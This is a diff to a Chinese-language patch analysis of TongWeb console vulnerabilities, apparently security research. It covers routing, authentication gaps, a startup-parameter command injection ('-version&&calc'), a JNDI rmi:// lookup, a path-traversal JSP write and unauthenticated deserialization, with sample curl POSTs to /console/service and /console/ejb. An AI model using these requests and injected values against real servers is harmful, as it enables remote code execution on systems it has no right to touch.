@@ -30,6 +30,82 @@ thanos thanos123.com
 cli cli123.com
 ```
 
+## 路由解析
+
+核心路由都在`/console/WEB-INF/web.xml`中
+
+Filter配置了：CharacterEncodingFilter、ConsoleFilter、LoginFilter、AuthorityFilter、AccessChecker、LogFilter。只有LoginFilter控制`/rest/*`，其他所有Filter管理的都是全路径`/*`
+
+Servlet配置，重点在于名为springmvc的servlet
+```
+    <servlet>
+        <servlet-name>springmvc</servlet-name>
+        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
+        <init-param>
+            <param-name>contextConfigLocation</param-name>
+            <param-value>
+                classpath*:console-tongweb-spring.xml,
+                classpath*:service-remotecall.xml
+            </param-value>
+        </init-param>
+        <load-on-startup>5</load-on-startup>
+    </servlet>
+```
+该servlet包含的路径如下
+```
+/dwr/*
+/rest/*
+/jqueryFileTre
+/notinrealm/rest/*
+/deploy/*
+/service/*
+```
+
+**安全认证配置**
+
+`<security-constraint>`会限制对某个资源的访问，`web-resource-collection`标识限制访问的资源子集。`<auth-constraint>`元素用于指定可以访问该资源集合的用户角色。如果没有指定auth-constraint元素，会约束所有角色。`<role-name>`元素包含安全角色的名称
+
+`<login-config>`用来指定所使用的验证方法、领域名和表单验证机制所需的特性。验证方法`<auth-method>`包括`BASIC、DIGEST、FORM、CLIENT-CERT`。如果是FORM就是采用表单验证。
+
+其中值得注意的是`none-realm-resources`下的路由，这些不受权限认证的限制。除了静态资源的访问路径，`/notinrealm/rest/*`、`/service`是上面springmvc对应的路径
+```xml
+    <security-constraint>
+        <web-resource-collection>
+            <web-resource-name>none-realm-resources</web-resource-name>
+            <url-pattern>/notinrealm/rest/*</url-pattern>
+            <url-pattern>/service</url-pattern>
+            <url-pattern>/403error.jsp</url-pattern>
+            <url-pattern>/408error.jsp</url-pattern>
+            <url-pattern>/css/*</url-pattern>
+            <url-pattern>/images/*</url-pattern>
+            <url-pattern>/res/*</url-pattern>
+            <url-pattern>/script/*</url-pattern>
+            <url-pattern>/pages/monitor/*</url-pattern>
+        </web-resource-collection>
+    </security-constraint>
+    <security-constraint>
+        <display-name>TongWeb Security Constraint</display-name>
+        <web-resource-collection>
+            <web-resource-name>Protected Area</web-resource-name>
+            <url-pattern>/*</url-pattern>
+        </web-resource-collection>
+        <auth-constraint>
+            <role-name>tongweb</role-name>
+            <role-name>security</role-name>
+            <role-name>auditor</role-name>
+        </auth-constraint>
+    </security-constraint>
+
+    <login-config>
+        <auth-method>FORM</auth-method>
+        <realm-name>twnt-realm</realm-name>
+        <form-login-config>
+            <form-login-page>/login.jsp</form-login-page>
+            <form-error-page>/loginerror.jsp</form-error-page>
+        </form-login-config>
+    </login-config>
+```
+
 
 ## 补丁分析
 补丁地址： http://www.tongtech.com/Services/Services-103_2.html
@@ -358,7 +434,9 @@ http://ip:9060/console/rest/jca/nameCheck?name=rmi://ip:1099/jzr8wb
 
 **（2）命令执行**
 
-启动参数存在可执行命令，ExternalOptions，修复主要是加入```if (!twOpt.contains("`") && !twOpt.contains("%60")) ```，待解决，未找到对应启动参数
+启动参数存在可执行命令，ExternalOptions，修复主要是加入```if (!twOpt.contains("`") && !twOpt.contains("%60")) ```，`twOpt`对应服务器参数。
+
+在console的启动参数配置——服务器参数中加入`-version&&calc`，利用命令注入的方式进行攻击，一旦服务器重启，可造成命令执行。
 
 ### 补丁5
 
@@ -372,37 +450,180 @@ GET http://ip:9060/console/rest/log/allFiles
 POST http://ip:9060/console/rest/log/downloadLog?names=server.log
 ```
 
-applications/heimdall/WEB-INF/classes/com/tongweb/console/log/controller/LogShowController.class
+对应的类
+```
+# LogShowController
 
-applications/console/WEB-INF/classes/com/tongweb/console/log/service/LogFinder.class
+@POST
+@Path("downloadLog")
+public JSONObject downloadLog() {
+    try {
+        String[] logFileNames = this.getArrayParameterMap("names");
+        this.finder.downloadLog(logFileNames, this.response);
+    } ...
+}
+
+
+# LogFinder
+
+public void downloadLog(String[] logFileNames, HttpServletResponse response) throws Exception {
+        this.refreshRotatedFiles();
+        List<File> files = new ArrayList();
+        String[] arr$ = logFileNames;
+        int len$ = logFileNames.length;
+
+        for(int i$ = 0; i$ < len$; ++i$) {
+            String fileName = arr$[i$];
+            File file = new File(this.logFile.getParent(), fileName);
+            if (file.getCanonicalFile().getParent().equals(this.logFile.getParent())) {
+                files.add(file);
+            }
+        }
+
+        downloadFiles(files, response);
+    }
+```
+
+<details>
+  <summary>downloadFiles代码</summary>
+  <pre>
+  <code>
+  public static void downloadFiles(List<File> files, HttpServletResponse response) throws Exception {
+        ZipOutputStream os = null;
+        try {
+            response.addHeader("Content-disposition", "attachment; filename=log.zip");
+            response.setContentType("application/octet-stream");
+            os = new ZipOutputStream(new BufferedOutputStream(response.getOutputStream()));
+            byte[] buff = new byte[1024];
+            Iterator i$ = files.iterator();
+            while(i$.hasNext()) {
+                File file = (File)i$.next();
+                BufferedInputStream fis = null;
+                try {
+                    fis = new BufferedInputStream(new FileInputStream(file));
+                    os.putNextEntry(new ZipEntry(file.getName()));
+                    int len;
+                    while((len = fis.read(buff)) > 0) {
+                        os.write(buff, 0, len);
+                    }
+                    os.closeEntry();
+                } finally {
+                    fis.close();
+                }
+            }
+        } finally {
+            if (os != null) {
+                os.close();
+            }
+        }
+    }
+  </code>
+  </pre>
+</details>
 
 **（2）修复管理控制台未授权访问漏洞**
 
 TongWeb6控制台创建用户、修改用户和设置权限_补丁004
 
-com.tongweb.console.security.controller.UserController#create/update
+补丁在`com.tongweb.console.security.controller.UserController#create/update`的方法中都加入了如下的权限判断
+	
+```
+HttpSession session = this.request.getSession();
+GenericPrincipal genericPrincipal = (GenericPrincipal)((StandardSession)((StandardSessionFacade)session).session).getPrincipal();
+if (genericPrincipal == null) {
+    resultInfo.setSuccess(false);
+    resultInfo.setMessage("No permission");
+    return resultInfo;
+} else {
+    String[] loginRoles = genericPrincipal.getRoles();
+    UserBean u = null;
+
+    try {
+	u = this.userService.getUserByName(realmName, name);
+    } catch (Exception var23) {
+	resultInfo = ResultInfoUtil.getResultInfo(var23, name);
+    }
+
+    if (u.getRoles() == null || u.getName() == null) {
+	roles = "";
+	if (!"tongweb".equals(loginRoles[0])) {
+	    resultInfo.setSuccess(false);
+	    resultInfo.setMessage("No permission");
+	    return resultInfo;
+	}
+    }
+```
 
 **（3）命令执行漏洞**
 
 **（4）console存在命令行执行漏洞**
 
-console控制台反序列化漏洞_补丁005
-
-com/tongweb/heimdall/common/remotecall/HttpInvokerServiceExporter.class
+位于补丁_005。`com/tongweb/heimdall/common/remotecall/HttpInvokerServiceExporter.class`，这个类在查找路由的时候，可以和前面路由部分的内容对照。`/service`是springmvc在加载`service-remotecall.xml`时配置的。`/service`由SimpleUrlHandlerMapping进行分发，对应的处理类id为remoteCall，实际类为`org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter`，也就是打补丁的这个类
+	
+```xml
+<bean
+	id="remoteCall"
+	class="org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter">
+	<property
+		name="service">
+		<bean
+			class="com.tongweb.common.remotecall.server.HttpInvokerRemoteCall" />
+	</property>
+	<property
+		name="serviceInterface"
+		value="com.tongweb.common.remotecall.RemoteCall" />
+</bean>
+<bean
+	class="org.springframework.web.servlet.handler.SimpleUrlHandlerMapping">
+	<property
+		name="urlMap">
+		<map>
+			<entry
+				key="/service"
+				value-ref="remoteCall" />
+		</map>
+	</property>
+</bean>
+```
+HttpInvokerServiceExporter处理请求的方法如下
+```java
+    public void handleRequest(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+        try {
+            RemoteInvocation invocation = this.readRemoteInvocation(request);
+            RemoteInvocationResult result = this.invokeAndCreateResult(invocation, this.getProxy());
+            this.writeRemoteInvocationResult(request, response, result);
+        } catch (ClassNotFoundException var5) {
+            throw new NestedServletException("Class not found during deserialization", var5);
+        }
+    }
+```
+readRemoteInvocation核心代码如下，进行了反序列化操作
+```
+ObjectInputStream ois = this.createObjectInputStream(this.decorateInputStream(request, is));
+RemoteInvocation var4 = this.doReadRemoteInvocation(ois); // doReadRemoteInvocation核心代码-> Object obj = ois.readObject();
+```
+那么这个漏洞的攻击就是对`/console/service`接口发送恶意反序列化数据包（注意，如果没有加如下的头部，代码执行过程中会抛出异常而报错）
+```
+curl -X POST "http://ip:9060/console/service" --data-binary @test2.txt -H "Content-type: application/octet-stream"
+```
 
 **（5）修复任意文件删除漏洞**
 
 
 **（6）访问日志-任意文件写入&路径穿越漏洞**
+	
+com.tongweb.console.log.controller.LogShowController_补丁003
 
-com.tongweb.console.webcontainer.controller.AccessLogController_补丁001
+/console/rest/log/setServerLogConfig
+
+../applications/console/aa.jsp
+
+位于补丁_001。`com.tongweb.console.webcontainer.controller.AccessLogController#update`
 
 /console/rest/webconfig/accesslog/put
 
 
-com.tongweb.console.log.controller.LogShowController_补丁003
 
-/console/rest/log/setServerLogConfig
 
 **（7）spring、CommonsCollections、XStream漏洞**
 
@@ -413,6 +634,10 @@ xmlpull、CommonsCollections、XStream组件升级_补丁008、补丁009
 com.tongweb.tongejb.server.httpd.ServerServlet
 com/tongweb/tongejb/core/ivm/EjbObjectInputStream.class_补丁002
 com/tongweb/tongejb/client/EjbObjectInputStream.class
+```
+需要注意的是，这个类本身在web.xml中默认是被注释掉的，也就是无法访问的。需要手动开启
+```	
+curl -X POST "http://ip:9060/console/ejb/" --data-binary @test2.txt
 ```
 
 com/tongweb/server/ExternalOptions_补丁006
